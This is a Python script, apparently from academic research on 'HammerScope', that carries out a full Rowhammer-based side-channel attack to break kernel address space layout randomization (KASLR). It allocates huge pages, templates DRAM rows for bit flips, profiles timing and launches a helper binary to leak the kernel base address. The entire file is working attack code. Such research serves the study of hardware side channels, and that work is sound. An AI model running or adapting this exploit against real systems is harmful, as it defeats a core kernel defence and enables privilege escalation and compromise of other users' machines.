from CycleTime import *
from HammerScope import *
from BuddyInfo import *
from sys import argv
from math import ceil, sqrt
import time
from datetime import datetime, timedelta
import csv
from collections import namedtuple
import operator
from tqdm import tqdm
import mmap
import copy
import subprocess
import random
import os

KB                 = (1 << 10)
MB                 = (KB << 10)
GB                 = (MB << 10)
#### 
MAX_ROW_NUMBER     = (1<<16)
####
BANK_CNT           = 16
ROW_BITS           = 16
HAMMERTIME         = 1*60
READ_OP            = 60000
####
N_SIDES            = 9
INIT_TRYS          = 2
TRYS               = 36
NO_THRESHOLD       = -1
NO_IDLE            = 0
####
BIN_READS_FOR_OFFSET_TEST = 100
####
HAMMERSCOPE_READ_TEST     = 100
HAMMERSCOPE_SECCUESS      = 0.25
####
CYCLE_TIME  = 30529955
BINS        = int(ceil(CYCLE_TIME / 1e6))
RECORD_TIME = 1*60*60
FLIP_THRESHOLD = 400
####
SECOND_CYCLE_ROUNDS = 3496 
LOWER_LIMIT = 200
UPPER_LIMIT = 2200
####
HAMMERSCOPE_TEST = 400000
PRE_READ_OP = 500*2
####
OPS_1_SEC = 16
WAIT_CYCLE_BEFORE_TEST = 0 * OPS_1_SEC
WAIT_CYCLE_AFTER_TEST  = 0 * OPS_1_SEC
SHM_OFFSET = 0x1FF
PRE_IDLE = 0xDEADBEEF
AFTER_IDLE = 0xC001C0DE
DEFAULT_PHYSICAL_OFFSET = 0xffffffff80800000
KERNEL_BIN_COUNT = 16
####
KASLR_PATH = ['./kaslr/kaslr.out']
####
flip = namedtuple('flip', ['base_index', 'flip_index', 'mod', 'value'])
####


def record_bin_data(rowhammer_bin_file_path, hl, flip_data, num_read, cycle_time, bin_index, shm_fd, shm_addr, tmp_hl_arr):
    stat_data = {}
    bin_width = int(ceil(cycle_time / float(BINS)))
    
    skip_header = False
    if os.path.isfile(rowhammer_bin_file_path):
      skip_header = True
      
    with open(rowhammer_bin_file_path, 'a', buffering=0) as f:
        writer = csv.writer(f, delimiter=',')
        
        if not skip_header:
          writer.writerow(['start_time', 'app_time', 'flip', 'flip_value', 'app_state', 'num_read'])
        
        p = None
        finish_cycle = None
        
        zero_bin_counter = 0
        min_kernel_address = None
        current_state = DEFAULT_PHYSICAL_OFFSET
        flip_counter = 0
        total_flips = 0
        
        for i in range(HAMMERSCOPE_TEST):
          
          rc, app_state = get_test_number(shm_addr, SHM_OFFSET)
          
          if i >= WAIT_CYCLE_BEFORE_TEST:
            if p is None:
              start_app_time = int(time.time()*1e9)
              p = subprocess.Popen(['taskset', '--cpu-list', '2'] + KASLR_PATH + [str(shm_fd)])

            elif p is not None and app_state == AFTER_IDLE:
              if finish_cycle is None:
                finish_cycle = i

              else:
                if i - finish_cycle >= WAIT_CYCLE_AFTER_TEST:
                  break
          
          hammer_row_all_reachable_pages(tmp_hl_arr[random.randint(0, TRYS-1)].base_index, PRE_READ_OP, NO_THRESHOLD, NO_IDLE)
          clear_hammer_db()
          
          res, value = test_hammer_bin_bitflip(hl, int(num_read * 1000), cycle_time, bin_index)
          if res == OK:
            
            writer.writerow([value.start_time, value.start_time - start_app_time, value.flip, value.value, app_state, int(num_read)])
            
            if app_state != PRE_IDLE and app_state != AFTER_IDLE:
                
              if app_state != current_state:
                
                if flip_counter == 0:
                  zero_bin_counter += 1
                  if min_kernel_address == None:
                    min_kernel_address = current_state
                  if zero_bin_counter >= KERNEL_BIN_COUNT:
                    break
                  
                if flip_counter != 0:
                  if zero_bin_counter < KERNEL_BIN_COUNT:
                    min_kernel_address = None
                    zero_bin_counter = 0
                
                print_log('{} - found {} flips out of {} attacks'.format(hex(current_state), flip_counter, total_flips))
                current_state = app_state  
                flip_counter = 0
                total_flips = 0
              
              if value.flip == 1:
                flip_counter += 1
              total_flips += 1
    
    return min_kernel_address
            

def hammertime(hl, max_rows):
    tmp_hl_arr = get_random_hl_arr(hl, TRYS, max_rows)
    if tmp_hl_arr == None:
      return None
    trys = 0
    counter = 0
    start = time.time()
    while time.time() - start < HAMMERTIME:
        hammer_row_all_reachable_pages(tmp_hl_arr[random.randint(0, TRYS-1)].base_index, PRE_READ_OP, NO_THRESHOLD, NO_IDLE)
        clear_hammer_db()
        rc, hr = test_hammer_bitflip(hl, READ_OP, -1, 0)
        trys += 1
        if hr.flip == 1:
            counter += 1
    return [counter, trys, tmp_hl_arr]

def find_min_1mb_block_number():
    mm_arr_1mb = []
    bi = BuddyInfo()
    buddyinfo_dict = bi.read_buddyinfo()
    min_num = buddyinfo_dict[0][2]['nr_free'][8]
    while True:
        rc, block_addr = alloc_1mb_block()
        if rc != OK:
          return -1
          
        mm_arr_1mb.append(block_addr)
        time.sleep(0.1)
        buddyinfo_dict = bi.read_buddyinfo()
        
        if min_num > buddyinfo_dict[0][2]['nr_free'][8]:
          min_num = buddyinfo_dict[0][2]['nr_free'][8]
        if min_num < buddyinfo_dict[0][2]['nr_free'][8]:
          break
    
    for block_addr in mm_arr_1mb:
      free_block(block_addr, 1)
    
    return min_num

def alloc_2mb_pages(page_num, min_1mb_blocks):
    bi = BuddyInfo()
    buddyinfo_dict = bi.read_buddyinfo()
    print_log('buddyinfo pre allocation:', buddyinfo_dict[0][2]['nr_free'])
    mm_arr_1mb = []
    mm_arr_2mb = []
    for i in range(page_num):
      
      while buddyinfo_dict[0][2]['nr_free'][8] != min_1mb_blocks:
        rc, block_addr = alloc_1mb_block()
        if rc != OK:
          return -1
          
        mm_arr_1mb.append(block_addr)
        time.sleep(0.1)
        buddyinfo_dict = bi.read_buddyinfo()
        
        if sum(buddyinfo_dict[0][2]['nr_free'][8:]) == 0:
          for block_addr_1mb in mm_arr_1mb:
            free_block(block_addr, 1)
          return mm_arr_2mb
      
      rc, block_addr = alloc_2mb_block()
      if rc != OK:
        return -1
      mm_arr_2mb.append(block_addr)
      time.sleep(0.1)
      buddyinfo_dict = bi.read_buddyinfo()
      
    for block_addr_1mb in mm_arr_1mb:
      free_block(block_addr_1mb, 1)
    
    buddyinfo_dict = bi.read_buddyinfo()
    print_log('buddyinfo after allocation:', buddyinfo_dict[0][2]['nr_free'])
    
    return mm_arr_2mb


def find_bit_flip(flip_threshold, max_rows):
    row_index = 1600-(N_SIDES*2) #(2**ROW_BITS)
    while row_index > 0:
      flips = 0
      hammer = 0  
      #print_log('scan base row number:', row_index)
      for i in range(BANK_CNT):
        tmp_row_index = (i<<ROW_BITS) + row_index        
        for j in range(INIT_TRYS):
          res = hammer_row_all_reachable_pages(tmp_row_index, N_SIDES, NO_THRESHOLD, NO_IDLE)
          if res < 0:
            #print_log(hex(tmp_row_index))
            break
          if res > 0:
            break
        
        if res >= 0:
          hammer += 1
        
        if i == BANK_CNT - 1:
          break
        
        if res > 0:
          hammer_list = get_hammer_db()
          for hl in hammer_list:
              hammertime_res = hammertime(hl, max_rows)
              if hammertime_res == None:
                continue
              flips_cnt, hammer_cnt, tmp_hl_arr = hammertime_res
              print_log('{} out of {} trys - BANK {}'.format(flips_cnt, hammer_cnt, i))
              if flips_cnt > flip_threshold:
                return hl, flip(hl.base_index, hl.row_index, hl.mod, hl.qword_value), tmp_hl_arr
          flips += 1

      if flips > 0 or hammer > 0:
        print_log('found {} bitflips while hammring {} rows, base index {}'.format(flips, hammer, row_index))
     
      row_index -= 1
    return None


def main():
    result_path = argv[-1]
    
    page_num = int(argv[1])
    
    max_rows = (BANK_CNT * page_num) - (N_SIDES * 2)
    
    
    total_time = templating_time = datetime.now()
    print_log('Starting templating step...')
    
    print_log('try to alloc {} 2MB pages'.format(page_num))
    min_1mb_blocks = find_min_1mb_block_number()
    hugepage_arr = alloc_2mb_pages(page_num, min_1mb_blocks)
    print_log('succeed to alloc {} 2MB pages'.format(len(hugepage_arr)))
    
    if len(hugepage_arr) == 0:
      return -1
    
    if init_db_user_alloc_hugepage(hugepage_arr, len(hugepage_arr)) != OK:
       return -1
    
    print_log('max rows:', get_total_row())
    print_log('allocated rows: {} ({:.2f}%)'.format(get_allocated_row(), (float(get_allocated_row())/get_total_row())*100))
    
    templating_time = datetime.now() - templating_time
    print_log('Templating step completed, templating took {}m{}s'.format(templating_time.seconds // 60, templating_time.seconds % 60))
    
    profiling_time = datetime.now()
    print_log('Starting profiling step...')
    hl, flip_data, tmp_hl_arr = find_bit_flip(FLIP_THRESHOLD, max_rows)
    #tmp_hl_arr = get_random_hl_arr(hl, TRYS)
    print_log(hl)
    
    if hl == None:
      return -1
    
    rc, shm_fd, shm_addr = map_shared_mem(BANK_CNT, 1)
    if rc != OK:
      return -1

    round_num = 55
    base_index = hl.base_index & (MAX_ROW_NUMBER - 1)

    reads_op = round_num 
    cycle_time, bin_max_index, bin_index = get_cycle_time(hl, reads_op, tmp_hl_arr)
    if bin_max_index == -1:
      print_log('bin_max_index: ', bin_max_index)
      return -1
      
    reads_op = 65
    profiling_time = datetime.now() - profiling_time
    print_log('Profiling step completed, profiling took {}m{}s'.format(profiling_time.seconds // 60, profiling_time.seconds % 60))
           
    rowhammer_file_path = join(result_path, 'rowhammer_bin_data_{}_{}_{}.csv'.format(int(reads_op), flip_data.base_index, flip_data.flip_index))
    write_test_number(shm_addr, SHM_OFFSET, PRE_IDLE)
    
    attck_time = datetime.now()
    print_log('Starting KASLR attack...')
    addr = record_bin_data(rowhammer_file_path, hl, flip_data, reads_op, cycle_time, bin_max_index, shm_fd, shm_addr, tmp_hl_arr)

    print_log('kernel address: {}'.format(hex(addr)))
    attck_time = datetime.now() - attck_time
    print_log('Attack completed, KALSR attack took {}m{}s'.format(attck_time.seconds // 60, attck_time.seconds % 60))
      
    total_time = datetime.now() - total_time
    print_log('Total end-to-end time {}m{}s'.format(total_time.seconds // 60, total_time.seconds % 60))
    
    return OK


if __name__ ==  '__main__':
    exit_code = main()
    print_log('test exit code:', exit_code)
    exit(exit_code)